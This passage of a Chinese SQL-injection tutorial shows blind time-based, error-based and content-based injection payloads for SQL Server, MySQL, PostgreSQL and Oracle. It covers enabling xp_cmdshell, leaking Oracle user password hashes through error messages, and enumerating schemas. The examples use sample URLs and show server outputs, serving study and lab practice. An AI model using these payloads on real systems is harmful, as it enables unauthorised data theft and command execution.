<span class="token comment">-- 将前面的查询拼凑成永假式，将返回后面的第一个结果</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-2/?id=0 union select NULL,username,password from users limit 1,1 -- </span>
<span class="token comment">-- 加一个限制条件返回第二条数据，where也行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="使用条件语句"><a href="#使用条件语句" class="headerlink" title="使用条件语句"></a>使用条件语句</h3><p>构建条件语句，条件语句的执行结果强迫服务器返回不同的结果，由结果的状态来判断条件是否为真</p>
<p><img src="https://images.dadream.eu.org/images/2024/07/ad493d6543d96db885d9a1428870d1ea.png"></p>
<h4 id="基于时间"><a href="#基于时间" class="headerlink" title="基于时间"></a>基于时间</h4><p>基于Web应用响应时间上的差异，该时间取决于某些信息的值。</p>
<h5 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> @<span class="token variable">@version</span><span class="token punctuation">;</span>
Microsoft <span class="token keyword">SQL</span> Server <span class="token number">2005</span> <span class="token operator">-</span> <span class="token number">9.00</span><span class="token number">.3042</span><span class="token number">.00</span> <span class="token punctuation">(</span>Intel X86<span class="token punctuation">)</span>
Feb <span class="token number">9</span> <span class="token number">2007</span> <span class="token number">22</span>:<span class="token number">47</span>:<span class="token number">07</span>
Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">1988</span><span class="token operator">-</span><span class="token number">2005</span> Microsoft Corporation 
Standard Edition <span class="token keyword">on</span> Windows NT <span class="token number">5.2</span> <span class="token punctuation">(</span>Build <span class="token number">3790</span>: Service Pack <span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12;if+(system_user='sa')+WAITFOR+DELAY+'0:0:5'-- </span>
<span class="token comment">-- 若system_user用户是系统管理员账户'sa',则会执行后面的waitfor delay函数，页面延迟5s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">IF</span> <span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> @<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'0:0:5'</span><span class="token comment">-- </span>
<span class="token comment">-- 截取@@version的第25个字符是否为5，为5就是2005数据库，并且延迟返回</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>跑个脚本能把这一整段跑出来，精确判断，判断补丁，利用补丁攻击</p>
<p><img src="https://images.dadream.eu.org/images/2024/07/611e433cc3ffdeba5e68dcaaa0a90f0d.png"></p>
<p><a target="_blank" rel="noopener" href="https://www.sqlteam.com/articles/sql-server-versions">SQL Server Version - SQLTeam.com</a></p>
<p>如果有管理员权限，可以使用xp_cmdshell扩展储存过程来产生延迟，它通过加载一条需要花费特定秒数的命令来实现。</p>
<p>启用xp_cmdshell</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- sql server 2005 2008</span>
<span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span>
GO
<span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>
<span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell*'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- sql server 2000</span>
<span class="token keyword">exec</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>sp_addextendedproc <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token string">'xplog70.dll'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'ping -n 5 127.0.0.1'</span>
<span class="token comment">-- ping回路5s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h5 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> benchmark<span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">,</span>sha1<span class="token punctuation">(</span><span class="token string">'blah'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">-- 执行后面的语句1000000次</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">-- 睡眠5s 配合if使用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h5 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> pg_sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- unix</span>
<span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> sleep <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token keyword">RETURNS</span> <span class="token keyword">int</span> <span class="token keyword">AS</span> <span class="token string">'/lib/libc.so.6'</span><span class="token punctuation">,</span><span class="token string">'sleep'</span> <span class="token keyword">language</span> <span class="token string">'C'</span> STRICT<span class="token punctuation">;</span> <span class="token keyword">SELECT</span> sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h5 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> utl_http<span class="token punctuation">.</span>request <span class="token punctuation">(</span><span class="token string">' http://10.0.0.1/ '</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span> <span class="token keyword">select</span> HTTPURITYPE<span class="token punctuation">(</span><span class="token string">' http://10.0.0.1/ '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getclob<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span>
<span class="token comment">-- 使用UTL HTTP或HTTPURITYPE向一个'死的'IP地址发送一个HTTP请求查询将一直等待连接直到超时</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> decode<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> all_objects<span class="token punctuation">,</span>all_objects<span class="token punctuation">,</span>all_objects<span class="token punctuation">,</span>all_objects<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token comment">-- 笛卡尔积</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="基于错误"><a href="#基于错误" class="headerlink" title="基于错误"></a>基于错误</h4><p>返回两种状态，其中一种状态是错误</p>
<p>sql server</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12/is_srvrolemember('sysadmin')</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>is_srvrolemember()是SQL Server T-SQL的一个函数，返回</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>：如果用户属于指定的组。
<span class="token number">0</span>：如果用户不属于指定的组。
NULL：如果指定的组不存在。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>意思很明确，返回1的话就会拼接成12/1,id=12会返回结果，0则报错，具体报错不深究</p>
<p>case语句也能这样使用，堆叠不能用它都能用</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12/(case+when+(system_user='sa')+then+1+else+0+end)</span>

http:<span class="token comment">//sql/Less-2/?id=12/(if(1=1,1,0))</span>

http:<span class="token comment">//sql/Less-2/?id=12/(case 1 when 1 then 1 else 0 end)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="基于内容"><a href="#基于内容" class="headerlink" title="基于内容"></a>基于内容</h4><p>执行语句返回内容和不执行返回的内容不同，相比于基于时间，基于错误会更快，基于内容不会产生错误，有点不言而喻。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-2/?id=10%2B(if(1=1,1,0))</span>
<span class="token comment">-- 若成功执行if语句,就会返回id=11的结果，对比10不同</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="处理字符串"><a href="#处理字符串" class="headerlink" title="处理字符串"></a>处理字符串</h4><p>前面介绍的都是数值上的技术，这段介绍字符上的技巧</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12</span>
<span class="token comment">-- 正常查询，id=13时结果为空，sql语句为</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'12'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=1'%2B'2</span>
<span class="token comment">-- 结果和上面相同，因为连接成了12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这时可以将char()函数放在2的位置测试</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=1'%2Bchar(50)'</span>

<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">+</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>执行结果和前面相同，这是可以将条件语句插入2的位置</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=1'%2Bchar(49%2B(case+when+(system_user+=+'sa')+then+l+else+0+end))'</span>

<span class="token comment">-- 如果是sa执行后id=13，不是则id=12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>根据结果的不同可以判断条件</p>
<h4 id="拓展攻击"><a href="#拓展攻击" class="headerlink" title="拓展攻击"></a>拓展攻击</h4><p>简而言之，不在局限于判断sa用户了，而是得到所有信息，先得到用户名长度</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12/(case+when+(len(system_user)+&gt;+16)+then+1+else+0+end)</span>
http:<span class="token comment">//test/?id=12/(case+when+(len(system_user)+&gt;+12)+then+1+else+0+end)</span>
http:<span class="token comment">//test/?id=12/(case+when+(len(system_user)+&gt;+10)+then+1+else+0+end)</span>
<span class="token comment">-- 二分查找，错误和成功的交界就是正确的值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下一次查找组成用户名的每个值</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12/(case+when+(ascii(substring(select+system_user),1,1))+&gt;+64)+then+1+else+0+end)</span>
<span class="token comment">-- 二分查找</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这些过程一般都交给自动化脚本</p>
<h4 id="利用SQL注入错误"><a href="#利用SQL注入错误" class="headerlink" title="利用SQL注入错误"></a>利用SQL注入错误</h4><p>将检索的信息注入进报错信息中</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=system_user</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Microsoft OLE DB Provider <span class="token keyword">for</span> ODBC Drivers error <span class="token string">'80040e07'</span> 
<span class="token punctuation">[</span>Microsoft<span class="token punctuation">]</span><span class="token punctuation">[</span>ODBC SQL Server Driver<span class="token punctuation">]</span><span class="token punctuation">[</span>SQL Server<span class="token punctuation">]</span>Conversion failed when converting the nvarchar value <span class="token string">'appdbuser'</span> to data <span class="token builtin class-name">type</span> int.
/products.asp, line <span class="token number">33</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><code>appdbuser</code>很明显这个返回能做文章，使用前面提到的<code>is_srvrolemember</code>的返回值强制类型转换</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=char(65%2Bis_srvrolemember('sysadmin'))</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Microsoft OLE DB Provider <span class="token keyword">for</span> ODBC Drivers error <span class="token string">'80040e07'</span> 
<span class="token punctuation">[</span>Microsoft<span class="token punctuation">]</span><span class="token punctuation">[</span>ODBC SQL Server Driver<span class="token punctuation">]</span><span class="token punctuation">[</span>SQL Server<span class="token punctuation">]</span>Conversion failed when converting the nvarchar value <span class="token string">'B'</span> to data <span class="token builtin class-name">type</span> int. 
/products.asp, line <span class="token number">33</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>如果当前用户不属于sysadmin组，那么is srvrolemember将返回0，char(65+0)将返回字母A,如果当前用户拥有管理员权限，那么is_srvrolemember将返回1, char(65+1)将返回字母B。</p>
<p><code>having 1=1</code>基于报错，枚举当前查询用得列名，通常和<code>group by</code>一起使用，group by将已查询到的列去除，再次枚举现在第一列，sql server能产生第一列错误信息</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=1+having+1=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Microsoft OLE DB Provider <span class="token keyword">for</span> ODBC Drivers error <span class="token string">'80040e14'</span>
<span class="token punctuation">[</span>Microsoft<span class="token punctuation">]</span><span class="token punctuation">[</span>ODBC SQL Server Driver<span class="token punctuation">]</span><span class="token punctuation">[</span>SQL Server<span class="token punctuation">]</span>Column <span class="token string">'products.id'</span> is invalid <span class="token keyword">in</span> the <span class="token keyword">select</span> list because it is not contained <span class="token keyword">in</span> either an aggregate <span class="token keyword">function</span> or the GROUP BY clause.
/products.asp, line <span class="token number">233</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><code>products.id</code>就是第一条列名，要查询第二条</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=1+group+by+products.id+having+1=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Microsoft OLE DB Provider <span class="token keyword">for</span> ODBC Drivers error <span class="token string">'80040e14'</span> 
<span class="token punctuation">[</span>Microsoft<span class="token punctuation">]</span> <span class="token punctuation">[</span>ODBC <span class="token keyword">SQL</span> Server Driver<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">SQL</span> Server<span class="token punctuation">]</span><span class="token keyword">Column</span> <span class="token string">'products.name'</span> <span class="token operator">is</span> invalid <span class="token operator">in</span> the <span class="token keyword">select</span> list because it <span class="token operator">is</span> <span class="token operator">not</span> contained <span class="token operator">in</span> either an aggregate <span class="token keyword">function</span> <span class="token operator">or</span> the <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> clause<span class="token punctuation">.</span>
<span class="token operator">/</span>shop<span class="token punctuation">.</span>asp<span class="token punctuation">,</span> line <span class="token number">233</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>第一列属于GROUP BY子句，因而该错误现在由第二列products.name触发。接下来将该列添加到GROUP BY子句，不需要清除前面的内容</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/shop.asp?id=1+group+by+products.id,products.name+having+1=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Oracle中的错误信息"><a href="#Oracle中的错误信息" class="headerlink" title="Oracle中的错误信息"></a>Oracle中的错误信息</h4><p><code>utl_inaddr</code>，该函数负责解析主机名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> utl_inaddr<span class="token punctuation">.</span>get_host_name<span class="token punctuation">(</span><span class="token string">'victim'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span>

ORA<span class="token operator">-</span><span class="token number">29257</span> : host victim unknown
ORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTL_INADDR"</span><span class="token punctuation">,</span> line <span class="token number">4</span>
ORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTL_INADDR"</span><span class="token punctuation">,</span> line <span class="token number">35</span>
ORA<span class="token operator">-</span><span class="token number">06512</span>: at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>关注victim，和前面小节一样，向utl_inaddr传入的都会显示在错误中</p>
<p>用select语句替换victim，有个限制：只能返回一列和一行，否者会收到另一种报错信息ORA-01427错误消息：single-row subquery returns more than one row。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> utl_inaddr<span class="token punctuation">.</span>get_host_name<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> username<span class="token operator">||</span><span class="token string">'='</span><span class="token operator">||</span>password <span class="token keyword">from</span> dba_users <span class="token keyword">where</span> rownum<span class="token operator">=</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span>
ORA<span class="token operator">-</span><span class="token number">29257</span>: host SYS<span class="token operator">=</span>D4DF7931AB130E37 unknown
ORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTL—INADDR"</span><span class="token punctuation">,</span> line <span class="token number">4</span>
ORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTL—INADDR"</span><span class="token punctuation">,</span> line <span class="token number">35</span>
ORA<span class="token operator">-</span><span class="token number">06512</span>: at line <span class="token number">1</span>

<span class="token keyword">select</span> utl_inaddr<span class="token punctuation">.</span>get_host_name<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> banner <span class="token keyword">from</span> v$version <span class="token keyword">where</span> rownum<span class="token operator">=</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span>
ORA<span class="token operator">-</span><span class="token number">29257</span>: host ORACLE <span class="token keyword">DATABASE</span> <span class="token number">10</span>G <span class="token keyword">RELEASE</span> <span class="token number">10.2</span><span class="token number">.0</span><span class="token number">.1</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token number">64</span>BIT PRODUCTION unknown
ORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTL—INADDR"</span><span class="token punctuation">,</span> line <span class="token number">4</span>
ORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTL—INADDR"</span><span class="token punctuation">,</span> line <span class="token number">35</span>
ORA<span class="token operator">-</span><span class="token number">06512</span>: at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>rownum=1是控制返回第几条，不然不能得到预期结果，||管道符拼接则是绕过只能返回一列的限制</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username<span class="token operator">||</span><span class="token string">'='</span><span class="token operator">||</span>password <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> rownum r<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> dba_users<span class="token punctuation">)</span> <span class="token keyword">where</span> r<span class="token operator">=</span><span class="token number">1</span>
ORA<span class="token operator">-</span><span class="token number">29257</span>: host SYS<span class="token operator">=</span>D4DF7931AB130E37 unknown
<span class="token comment">-- 为避免所连接的字符串中出现单引号，可选用concat函数：</span>
<span class="token keyword">select</span> concat<span class="token punctuation">(</span>concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span>chr<span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> rownum r<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> dba_users<span class="token punctuation">)</span> <span class="token keyword">where</span> r<span class="token operator">=</span><span class="token number">2</span>
ORA<span class="token operator">-</span><span class="token number">29257</span>: host SYSTEM<span class="token operator">=</span>E45049312A231FD1 unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>绕过单行限制以获取多行信息。可通过使用带XML的专用SQL语句或专用的Oracle函数stragg(11g+)来在单行中获取所有行,上述两种方法唯一的限制是输出大小(最大为 4000字节)：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> xmltransform<span class="token punctuation">(</span>sys_xmlagg<span class="token punctuation">(</span>sys_xmlgen<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>xmltype<span class="token punctuation">(</span><span class="token string">'&lt;?xml version="l.0"?&gt;&lt;xsl:stylesheet version="l.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;&lt;xsl:template match:"/"&gt;&lt;xsl:for-each select="/ROWSET/USERNAME"&gt;&lt;xsl:value-of select="text()"/&gt;;&lt;/xsl:for-each&lt;/xsl:template &lt;/xsl:stylesheet&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getstringval<span class="token punctuation">(</span><span class="token punctuation">)</span> listagg <span class="token keyword">from</span> all_users<span class="token punctuation">;</span>
<span class="token keyword">select</span> sys<span class="token punctuation">.</span>stragg<span class="token punctuation">(</span><span class="token keyword">distinct</span> username<span class="token operator">||</span><span class="token string">';'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> all_users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这段代码注入utl_inaddr中，就会输出所有用户名：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ALEX<span class="token punctuation">;</span>ANONYMOUS<span class="token punctuation">;</span>APEX_PUBLIC_USER<span class="token punctuation">;</span>CTXSYS<span class="token punctuation">;</span>DBSNMP<span class="token punctuation">;</span>DEMO1<span class="token punctuation">;</span>DIP<span class="token punctuation">;</span>DUMMY<span class="token punctuation">;</span>
EXFSYS<span class="token punctuation">;</span>FLOWS_030000<span class="token punctuation">;</span>FLOWS_FILES<span class="token punctuation">;</span>MDDATA<span class="token punctuation">;</span>MDSYS<span class="token punctuation">;</span>MGMT_VIEW<span class="token punctuation">;</span>
MONODEMO<span class="token punctuation">;</span>OLAPSYS<span class="token punctuation">;</span>ORACLE_OCM<span class="token punctuation">;</span>ORDPLUGINS<span class="token punctuation">;</span>ORDSYS<span class="token punctuation">;</span>OUTLN<span class="token punctuation">;</span>
OWBSYS<span class="token punctuation">;</span>PHP<span class="token punctuation">;</span>PLSQL<span class="token punctuation">;</span>SCOTT<span class="token punctuation">;</span>SI_INFORMTN_SCHEMA<span class="token punctuation">;</span>SPATIAL_CSW_ADMIN_USR<span class="token punctuation">;</span>
SPATIAL_WFS_ADMIN_USR<span class="token punctuation">;</span>SYS<span class="token punctuation">;</span>SYSMAN<span class="token punctuation">;</span>SYSTEM<span class="token punctuation">;</span>TSMSYS<span class="token punctuation">;</span>WKPROXY<span class="token punctuation">;</span>WKSYS<span class="token punctuation">;</span>
WK_TEST<span class="token punctuation">;</span>WMSYS<span class="token punctuation">;</span>X<span class="token punctuation">;</span>XDB<span class="token punctuation">;</span>XS<span class="token variable">$NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>默认情况下，oracle llg通过ACL来限制对utl_inaddr和其他网络包访问，这时会得到报错network access denied by access control list，这种情况或者utl_inaddr取消了public权限，就要另外用其他函数了，下面列举函数</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#注入下列内容:</span>
Or <span class="token assign-left variable">1</span><span class="token operator">=</span>ORDSYS.ORD_DICOM.GETMAPPINGXPATH<span class="token punctuation">(</span>user,<span class="token string">'a'</span>,<span class="token string">'b'</span><span class="token punctuation">)</span>-- 
<span class="token comment">#返回下列内容：</span>
ORA-53044: invalid tag: VICTIMUSER
<span class="token comment">#注入下列内容：</span>
or <span class="token assign-left variable">1</span><span class="token operator">=</span>SYS.DBMS_AW_XML.READAWMETADATA<span class="token punctuation">(</span>user,<span class="token string">'a'</span><span class="token punctuation">)</span>-- 
<span class="token comment">#返回下列内容：</span>
ORA-29532: Java call terminated by uncaught Java exception: oracle.
AWXML.AWException: oracle.AWXML.AWException: An error has occurred, on the server
Error class: Express Failure
Server error descriptions:
ENG: ORA-34344: Analytic workspace VICTIMUSER is not attached.
<span class="token comment">#注入下列内容：</span>
Or <span class="token assign-left variable">1</span><span class="token operator">=</span> CTXSYS.CTX_QUERY.CHK_XPATH<span class="token punctuation">(</span>user,<span class="token string">'a'</span>,<span class="token string">'b'</span><span class="token punctuation">)</span>--
返回下列内容：
ORA-20000: Oracle Text error:
DRG-11701: thesaurus VICTIMUSER does not exist
ORA-06512: at <span class="token string">"CTXSYS.DRUE"</span>, line <span class="token number">160</span>
ORA-06512: at <span class="token string">"CTXSYS.DRITHSX"</span>, line <span class="token number">538</span>
ORA-06512: at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="枚举数据库模式"><a href="#枚举数据库模式" class="headerlink" title="枚举数据库模式"></a>枚举数据库模式</h3><p>在拥有权限的前提下，将所有元数据全部枚举出来</p>
<h4 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h4><p>有一个返回指定商品的详细信息的页面<code>http://test</code></p>
<p>返回数据表列表</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test?id=12+union+select+null,name,null,null+from+master..sysdatabases</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>master数据库包含了其他数据库的元数据，如master..sysdatabases可以检索出数据库名称列表</p>
<p>e-shop数据库包含了电子商务应用使用的所有数据。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> db_name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">-- 正在使用的数据库名称</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>枚举表名，每个数据都有一个名为<code>sysobjects</code>的表，假如想要检索e-shop数据库的表名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> e<span class="token operator">-</span>shop<span class="token punctuation">.</span><span class="token punctuation">.</span>sysobjects <span class="token keyword">WHERE</span> xtype<span class="token operator">=</span><span class="token string">'U'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到表名，枚举列名，以customers表为例</p>
